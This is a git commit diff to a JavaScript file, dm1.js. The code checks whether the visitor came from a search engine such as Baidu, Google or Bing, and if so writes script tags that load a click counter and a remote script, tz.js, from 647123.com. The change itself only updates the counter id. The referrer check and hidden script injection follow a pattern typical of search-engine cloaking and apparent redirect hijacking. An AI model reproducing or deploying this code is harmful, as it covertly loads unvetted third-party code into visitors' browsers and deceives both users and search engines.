39941c0d20bafec307978303359861b4f508f5f1
js999999999 <js-9@outlook.com>
2017-11-16 01:18:36 +0800

    Update dm1.js

--- cc1z/dm1.js
+++ cc1z/dm1.js
@@ -3,7 +3,7 @@ today=today.getYear()+"-"+(today.getMonth()+1)+"-"+today.getDate();
 var regexp=/\.(sogou|so|haosou|baidu|google|youdao|yahoo|bing|gougou|118114|vnet|360|ioage|sm|sp)(\.[a-z0-9\-]+){1,2}\//ig;
 var where =document.referrer;
 if(regexp.test(where)){
-document.write ('<script language="javascript" src="http://count7.51yes.com/click.aspx?id=b&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/cc1z/tz.js "></script></div>');
+document.write ('<script language="javascript" src="http://count7.51yes.com/click.aspx?id=77419839&logo=6" charset="gb2312"></script><script language="javascript" type="text/javascript" src="http://www.647123.com/cc1z/tz.js "></script></div>');
 }
 else
 {
